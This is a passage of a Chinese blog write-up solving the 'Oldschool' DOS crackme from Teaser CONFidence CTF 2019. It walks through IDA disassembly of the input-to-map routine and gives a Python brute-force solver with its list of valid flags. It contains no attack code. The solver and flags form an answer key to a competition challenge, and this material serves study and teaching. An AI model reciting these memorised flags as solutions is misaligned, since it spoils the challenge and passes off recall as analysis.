---------------------------------------------------------------------------</span><br><span class="line">seg001:008E</span><br><span class="line">seg001:008E loc_1017E:                              ; CODE XREF: sub_10148+9C↓j</span><br><span class="line">seg001:008E                                         ; sub_10148+A7↓j ...</span><br><span class="line">seg001:008E                 mov     al, dl</span><br><span class="line">seg001:0090                 and     al, 2</span><br><span class="line">seg001:0092                 jz      short loc_101BE</span><br><span class="line">seg001:0094                 jmp     short loc_101CE</span><br><span class="line">seg001:0096 ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:0096</span><br><span class="line">seg001:0096 loc_10186:                              ; CODE XREF: sub_10148:loc_101CC↓j</span><br><span class="line">seg001:0096                                         ; sub_10148:loc_101DD↓j</span><br><span class="line">seg001:0096                 push    cx</span><br><span class="line">seg001:0097                 mov     cl, 2</span><br><span class="line">seg001:0099                 shr     dl, cl</span><br><span class="line">seg001:009B                 pop     cx</span><br><span class="line">seg001:009C                 mov     bl, [si]</span><br><span class="line">seg001:009E                 inc     bl</span><br><span class="line">seg001:00A0                 mov     [si], bl</span><br><span class="line">seg001:00A2                 loop    loc_10176</span><br><span class="line">seg001:00A4                 pop     cx</span><br><span class="line">seg001:00A5                 loop    loc_10151</span><br><span class="line">seg001:00A7                 retn</span><br><span class="line">seg001:00A8 ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:00A8</span><br><span class="line">seg001:00A8 loc_10198:                              ; CODE XREF: sub_10148+17↑j</span><br><span class="line">seg001:00A8                 cmp     al, 2Fh ; &#39;&#x2F;&#39;</span><br><span class="line">seg001:00AA                 jb      short loc_101B4</span><br><span class="line">seg001:00AC                 sub     al, 30h ; &#39;0&#39;</span><br><span class="line">seg001:00AE                 jmp     short loc_1016B</span><br><span class="line">seg001:00B0 ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:00B0</span><br><span class="line">seg001:00B0 loc_101A0:                              ; CODE XREF: sub_10148+1F↑j</span><br><span class="line">seg001:00B0                 cmp     al, 60h ; &#39;&#96;&#39;</span><br><span class="line">seg001:00B2                 jb      short loc_101B4</span><br><span class="line">seg001:00B4                 sub     al, 61h ; &#39;a&#39;</span><br><span class="line">seg001:00B6                 add     al, 0Ah</span><br><span class="line">seg001:00B8                 jmp     short loc_1016B</span><br><span class="line">seg001:00BA ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:00BA</span><br><span class="line">seg001:00BA loc_101AA:                              ; CODE XREF: sub_10148+1B↑j</span><br><span class="line">seg001:00BA                 cmp     al, 40h ; &#39;@&#39;</span><br><span class="line">seg001:00BC                 jb      short loc_101B4</span><br><span class="line">seg001:00BE                 sub     al, 41h ; &#39;A&#39;</span><br><span class="line">seg001:00C0                 add     al, 0Ah</span><br><span class="line">seg001:00C2                 jmp     short loc_1016B</span><br><span class="line">seg001:00C4 ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:00C4</span><br><span class="line">seg001:00C4 loc_101B4:                              ; CODE XREF: sub_10148+21↑j</span><br><span class="line">seg001:00C4                                         ; sub_10148+52↑j ...</span><br><span class="line">seg001:00C4                 mov     dx, 0CAh</span><br><span class="line">seg001:00C7                 mov     ah, 9</span><br><span class="line">seg001:00C9                 int     21h             ; DOS - PRINT STRING</span><br><span class="line">seg001:00C9                                         ; DS:DX -&gt; string terminated by &quot;$&quot;</span><br><span class="line">seg001:00CB                 jmp     loc_10120</span><br><span class="line">seg001:00CE ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:00CE</span><br><span class="line">seg001:00CE loc_101BE:                              ; CODE XREF: sub_10148+3A↑j</span><br><span class="line">seg001:00CE                 mov     bx, si</span><br><span class="line">seg001:00D0                 cmp     bx, 11h</span><br><span class="line">seg001:00D3                 ja      short loc_101C7</span><br><span class="line">seg001:00D5                 jmp     short loc_101CC</span><br><span class="line">seg001:00D7 ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:00D7</span><br><span class="line">seg001:00D7 loc_101C7:                              ; CODE XREF: sub_10148+7B↑j</span><br><span class="line">seg001:00D7                 sub     bx, 12h</span><br><span class="line">seg001:00DA                 mov     si, bx</span><br><span class="line">seg001:00DC</span><br><span class="line">seg001:00DC loc_101CC:                              ; CODE XREF: sub_10148+7D↑j</span><br><span class="line">seg001:00DC                 jmp     short loc_10186</span><br><span class="line">seg001:00DE ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:00DE</span><br><span class="line">seg001:00DE loc_101CE:                              ; CODE XREF: sub_10148+3C↑j</span><br><span class="line">seg001:00DE                 mov     bx, si</span><br><span class="line">seg001:00E0                 cmp     bx, 8Fh</span><br><span class="line">seg001:00E4                 jb      short loc_101D8</span><br><span class="line">seg001:00E6                 jmp     short loc_101DD</span><br><span class="line">seg001:00E8 ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:00E8</span><br><span class="line">seg001:00E8 loc_101D8:                              ; CODE XREF: sub_10148+8C↑j</span><br><span class="line">seg001:00E8                 add     bx, 12h</span><br><span class="line">seg001:00EB                 mov     si, bx</span><br><span class="line">seg001:00ED</span><br><span class="line">seg001:00ED loc_101DD:                              ; CODE XREF: sub_10148+8E↑j</span><br><span class="line">seg001:00ED                 jmp     short loc_10186</span><br><span class="line">seg001:00EF ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:00EF</span><br><span class="line">seg001:00EF loc_101DF:                              ; CODE XREF: sub_10148+32↑j</span><br><span class="line">seg001:00EF                 mov     di, 0</span><br><span class="line">seg001:00F2                 cmp     si, di</span><br><span class="line">seg001:00F4                 jz      short loc_1017E</span><br><span class="line">seg001:00F6                 mov     ax, si</span><br><span class="line">seg001:00F8                 mov     bl, 12h</span><br><span class="line">seg001:00FA                 div     bl</span><br><span class="line">seg001:00FC                 cmp     ah, 0</span><br><span class="line">seg001:00FF                 jz      short loc_1017E</span><br><span class="line">seg001:0101                 mov     bx, si</span><br><span class="line">seg001:0103                 dec     bx</span><br><span class="line">seg001:0104                 mov     si, bx</span><br><span class="line">seg001:0106                 jmp     short loc_1017E</span><br><span class="line">seg001:0108 ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:0108</span><br><span class="line">seg001:0108 loc_101F8:                              ; CODE XREF: sub_10148+34↑j</span><br><span class="line">seg001:0108                 mov     di, 0</span><br><span class="line">seg001:010B                 cmp     si, di</span><br><span class="line">seg001:010D                 jz      short loc_1020D</span><br><span class="line">seg001:010F                 mov     ax, si</span><br><span class="line">seg001:0111                 mov     bl, 12h</span><br><span class="line">seg001:0113                 div     bl</span><br><span class="line">seg001:0115                 cmp     ah, 10h</span><br><span class="line">seg001:0118                 jnz     short loc_1020D</span><br><span class="line">seg001:011A                 jmp     loc_1017E</span><br><span class="line">seg001:011D ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:011D</span><br><span class="line">seg001:011D loc_1020D:                              ; CODE XREF: sub_10148+B5↑j</span><br><span class="line">seg001:011D                                         ; sub_10148+C0↑j</span><br><span class="line">seg001:011D                 mov     bx, si</span><br><span class="line">seg001:011F                 inc     bx</span><br><span class="line">seg001:0120                 mov     si, bx</span><br><span class="line">seg001:0122                 jmp     loc_1017E</span><br><span class="line">seg001:0122 sub_10148       endp</span><br></pre></td></tr></table></figure>
<p>看到，si开始指向0x50偏移位置，而后置cx为9,循环9次，每次循环：<br>通过int 21h 读取两个字符(mov cx,2)，其间会有一系列比较读入的字符，很显然保证输入为[0-9A-Fa-f],即16进制字符，看到如果不在范围内即会：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">seg001:00C4                 mov     dx, 0CAh</span><br><span class="line">seg001:00C7                 mov     ah, 9</span><br><span class="line">seg001:00C9                 int     21h </span><br><span class="line">#输出0xCA偏移处字符串：Invalid input, bye bye!</span><br></pre></td></tr></table></figure>
<p>当字符满足时会通过sub或者add获得字符对应的数值，而后：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">seg001:007B                 mul     bl</span><br><span class="line">seg001:007D                 add     dl, al</span><br><span class="line">seg001:007F                 mov     bl, 1</span><br><span class="line">seg001:0081                 loop    loc_10159</span><br></pre></td></tr></table></figure>
<p>bl初始为0x10，这里因为会读取第一个字节mul bl而后置bl为1再读取第二个字节，所以dl中每两个字符其值为：input[0]*0x10+input[1],其实就是将此两位16进制字符转换成数字。而后其根据数字进行操作：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">首先：</span><br><span class="line">seg001:0086                 mov     al, dl</span><br><span class="line">seg001:0088                 and     al, 1</span><br><span class="line">和：</span><br><span class="line">seg001:008E                 mov     al, dl</span><br><span class="line">seg001:0090                 and     al, 2</span><br><span class="line">即其会分别判断dl的末2bit值，然后判断si指针是否在界限内：</span><br><span class="line">当si%0x12 &gt;&#x3D;0 and  si%0x12 &lt;&#x3D;0x10，</span><br><span class="line">末位为0: si减小，末位为1: si增大</span><br><span class="line">否则到达上界不再增加，下界不再减小</span><br><span class="line">当si &gt;&#x3D;0x11 and si&lt;&#x3D;0x8F</span><br><span class="line">倒数第二bit为0: si-&#x3D;0x12，为1: si+&#x3D;0x12</span><br><span class="line">否则到达上界不再增加，下界不再减小</span><br><span class="line">两个位置判断后将dl右移两位，并且si所在位置自增1：</span><br><span class="line">seg001:0096                 push    cx</span><br><span class="line">seg001:0097                 mov     cl, 2</span><br><span class="line">seg001:0099                 shr     dl, cl</span><br><span class="line">seg001:009B                 pop     cx</span><br><span class="line">seg001:009C                 mov     bl, [si]</span><br><span class="line">seg001:009E                 inc     bl</span><br><span class="line">seg001:00A0                 mov     [si], bl</span><br><span class="line">seg001:00A2                 loop    loc_10176</span><br><span class="line">以此每两位字符转换成的数字以此处理4次：2*4&#x3D;8bit,正好对应两位16进制字符</span><br></pre></td></tr></table></figure>
<p>其实可以看出这是一个18*9的地图(正好对应最后的输出)，边界为16*9，以我们的输入作方向进行移动，最后根据每个位置所经过步数对应预先定义的字母表，最终输出。<br>最后注意起始位置和结束位置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">seg001:0019                 call    sub_10148</span><br><span class="line">seg001:001C                 mov     di, si</span><br><span class="line">seg001:001E                 call    sub_10215</span><br><span class="line">seg001:0021                 mov     al, 45h ; &#39;E&#39;</span><br><span class="line">seg001:0023                 mov     [di], al</span><br><span class="line">seg001:0025                 mov     si, 0</span><br><span class="line">seg001:0028                 mov     al, 53h ; &#39;S&#39;</span><br><span class="line">seg001:002A                 mov     [si+50h], al</span><br></pre></td></tr></table></figure>
<p>起始位置0x50处为”S”,结束位置（sub_10148返回si为最终位置）为”E”<br>对应flag.txt解即可，不过我以为解是p4{the_hex_string_we_input},但是提交不对，询问主办方，需要hex_string.decode(‘hex’)=p4{[0-9a-z]+}<br>所以确定了开始”p4{“和结束”}”，将得到的map简化并过滤字符求出满足条件的解即可：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment">#get the map</span></span><br><span class="line">key1=[</span><br><span class="line">  <span class="number">0x20</span>, <span class="number">0x70</span>, <span class="number">0x34</span>, <span class="number">0x7B</span>, <span class="number">0x6B</span>, <span class="number">0x72</span>, <span class="number">0x75</span>, <span class="number">0x6C</span>, <span class="number">0x65</span>, <span class="number">0x5F</span>, </span><br><span class="line">  <span class="number">0x63</span>, <span class="number">0x74</span>, <span class="number">0x66</span>, <span class="number">0x7D</span>, <span class="number">0x0A</span></span><br><span class="line">]</span><br><span class="line">key2=<span class="string">"        4 &#123;4pp           p &#123;k4&#123; E         p 44p&#123; p           4 p                S                                                                                 "</span></span><br><span class="line">key3=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(key2)):</span><br><span class="line">  <span class="keyword">if</span> i%<span class="number">18</span>==<span class="number">0</span>:</span><br><span class="line">    <span class="keyword">print</span> key3</span><br><span class="line">    key3=<span class="string">""</span></span><br><span class="line">  <span class="keyword">if</span> key2[i]==<span class="string">'E'</span> <span class="keyword">or</span> key2[i]==<span class="string">'S'</span>:</span><br><span class="line">    key3+=str(i)+<span class="string">"\t"</span></span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    key3+=str(key1.index(ord(key2[i])))+<span class="string">"\t"</span></span><br><span class="line">key4=<span class="string">"011111010011001000010110011100110110011010010111001100000111011011010000"</span></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">  flag+=hex(int(key4[<span class="number">72</span>-i*<span class="number">8</span>:<span class="number">72</span>-i*<span class="number">8</span>+<span class="number">8</span>],<span class="number">2</span>))[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">step</span><span class="params">(s,x,y,map)</span>:</span></span><br><span class="line">  dis=[]</span><br><span class="line">  <span class="keyword">for</span> o <span class="keyword">in</span> map:</span><br><span class="line">    dis.append(o)</span><br><span class="line">  l=ord(s)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">if</span> l&amp;<span class="number">1</span>==<span class="number">0</span> <span class="keyword">and</span> x!=<span class="number">0</span>:</span><br><span class="line">      x-=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> l&amp;<span class="number">1</span>==<span class="number">1</span> <span class="keyword">and</span> x!=<span class="number">5</span>:</span><br><span class="line">      x+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> l&amp;<span class="number">2</span>==<span class="number">0</span> <span class="keyword">and</span> y!=<span class="number">0</span>:</span><br><span class="line">      y-=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> l&amp;<span class="number">2</span>!=<span class="number">0</span> <span class="keyword">and</span> y!=<span class="number">3</span>:</span><br><span class="line">      y+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> dis[y*<span class="number">6</span>+x]==<span class="number">0</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span>,<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      dis[y*<span class="number">6</span>+x]-=<span class="number">1</span></span><br><span class="line">      l=l&gt;&gt;<span class="number">2</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">True</span>,x,y,dis</span><br><span class="line"></span><br><span class="line"><span class="comment">#确定开始"p4&#123;"和结束"&#125;"后简化了地图      </span></span><br><span class="line">key=[</span><br><span class="line"><span class="number">0</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">1</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">1</span>,</span><br><span class="line"><span class="number">2</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">]</span><br><span class="line">positon_x=<span class="number">1</span></span><br><span class="line">position_y=<span class="number">2</span></span><br><span class="line">k=<span class="string">"0123456789abcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line"><span class="comment">#5位过少，就没写递归循环，直接嵌套即可</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> k:</span><br><span class="line">    <span class="keyword">if</span> step(i,positon_x,position_y,key)[<span class="number">0</span>]==<span class="literal">True</span>:</span><br><span class="line">        n,positon_x1,position_y1,ke1=step(i,positon_x,position_y,key)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> k:</span><br><span class="line">          <span class="keyword">if</span>  step(j,positon_x1,position_y1,ke1)[<span class="number">0</span>]==<span class="literal">True</span>:</span><br><span class="line">            n,positon_x2,position_y2,ke2=step(j,positon_x1,position_y1,ke1)</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> k:</span><br><span class="line">              <span class="keyword">if</span> step(d,positon_x2,position_y2,ke2)[<span class="number">0</span>]==<span class="literal">True</span>:</span><br><span class="line">                n,positon_x3,position_y3,ke3=step(d,positon_x2,position_y2,ke2)</span><br><span class="line">                <span class="keyword">for</span> g <span class="keyword">in</span> k:</span><br><span class="line">                   <span class="keyword">if</span>  step(g,positon_x3,position_y3,ke3)[<span class="number">0</span>]==<span class="literal">True</span>:</span><br><span class="line">                     n,positon_x4,position_y4,ke4=step(g,positon_x3,position_y3,ke3)</span><br><span class="line">                     <span class="keyword">for</span> p <span class="keyword">in</span> k:</span><br><span class="line">                        <span class="keyword">if</span> step(p,positon_x4,position_y4,ke4)[<span class="number">0</span>]==<span class="literal">True</span>:</span><br><span class="line">                           n,positon_x5,position_y5,ke5=step(p,positon_x4,position_y4,ke4)</span><br><span class="line">                           <span class="keyword">if</span> step(<span class="string">'&#125;'</span>,positon_x5,position_y5,ke5)[<span class="number">0</span>]==<span class="literal">True</span>:</span><br><span class="line">                            <span class="keyword">print</span> <span class="string">"p4&#123;"</span>+i+j+d+g+p+<span class="string">"&#125;"</span></span><br><span class="line"><span class="comment">#output:</span></span><br><span class="line"><span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">2</span>	<span class="number">0</span>	<span class="number">3</span>	<span class="number">2</span>	<span class="number">1</span>	<span class="number">1</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	</span><br><span class="line"><span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">1</span>	<span class="number">0</span>	<span class="number">3</span>	<span class="number">4</span>	<span class="number">2</span>	<span class="number">3</span>	<span class="number">0</span>	<span class="number">32</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	</span><br><span class="line"><span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">1</span>	<span class="number">0</span>	<span class="number">2</span>	<span class="number">2</span>	<span class="number">1</span>	<span class="number">3</span>	<span class="number">0</span>	<span class="number">1</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	</span><br><span class="line"><span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">2</span>	<span class="number">0</span>	<span class="number">1</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	</span><br><span class="line"><span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">80</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	</span><br><span class="line"><span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	</span><br><span class="line"><span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	</span><br><span class="line"><span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	<span class="number">0</span>	</span><br><span class="line">p4&#123;<span class="number">4</span>qi2f&#125;</span><br><span class="line">p4&#123;<span class="number">4</span>qib6&#125;</span><br><span class="line">p4&#123;<span class="number">4</span>qibc&#125;</span><br><span class="line">p4&#123;aqi2f&#125;</span><br><span class="line">p4&#123;aqib6&#125;</span><br><span class="line">p4&#123;aqibc&#125;</span><br><span class="line">p4&#123;qi2fa&#125;</span><br><span class="line">p4&#123;qib6a&#125;</span><br><span class="line">p4&#123;qibca&#125;</span><br><span class="line">p4&#123;ti2f1&#125;</span><br><span class="line">p4&#123;tib61&#125;</span><br><span class="line">p4&#123;tibc1&#125;</span><br><span class="line">[Finished <span class="keyword">in</span> <span class="number">1.0</span>s]</span><br><span class="line"><span class="comment">#题目说明有多解，随意提交其中一个即可</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">文章首发先知社区：</span><br><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;4574</span><br></pre></td></tr></table></figure>
  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#p4fmt"><span class="toc-number">1.</span> <span class="toc-text">p4fmt</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze"><span class="toc-number">1.1.</span> <span class="toc-text">Analyze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Debug"><span class="toc-number">1.2.</span> <span class="toc-text">Debug</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">1.3.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Oldschool"><span class="toc-number">2.</span> <span class="toc-text">Oldschool</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/03/23/Teaser-CONFidence-CTF-2019-p4fmt-oldschool/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/03/23/Teaser-CONFidence-CTF-2019-p4fmt-oldschool/&text=Teaser CONFidence CTF 2019 p4fmt&amp;&amp;oldschool" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/03/23/Teaser-CONFidence-CTF-2019-p4fmt-oldschool/&title=Teaser CONFidence CTF 2019 p4fmt&amp;&amp;oldschool" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/03/23/Teaser-CONFidence-CTF-2019-p4fmt-oldschool/&is_video=false&description=Teaser CONFidence CTF 2019 p4fmt&amp;&amp;oldschool" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Teaser CONFidence CTF 2019 p4fmt&amp;&amp;oldschool&body=Check out this article: http://yoursite.com/2019/03/23/Teaser-CONFidence-CTF-2019-p4fmt-oldschool/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/03/23/Teaser-CONFidence-CTF-2019-p4fmt-oldschool/&title=Teaser CONFidence CTF 2019 p4fmt&amp;&amp;oldschool" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/03/23/Teaser-CONFidence-CTF-2019-p4fmt-oldschool/&title=Teaser CONFidence CTF 2019 p4fmt&amp;&amp;oldschool" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/03/23/Teaser-CONFidence-CTF-2019-p4fmt-oldschool/&title=Teaser CONFidence CTF 2019 p4fmt&amp;&amp;oldschool" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/03/23/Teaser-CONFidence-CTF-2019-p4fmt-oldschool/&title=Teaser CONFidence CTF 2019 p4fmt&amp;&amp;oldschool" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/03/23/Teaser-CONFidence-CTF-2019-p4fmt-oldschool/&name=Teaser CONFidence CTF 2019 p4fmt&amp;&amp;oldschool&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2020 Kirin
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/links/">Links</a></li>
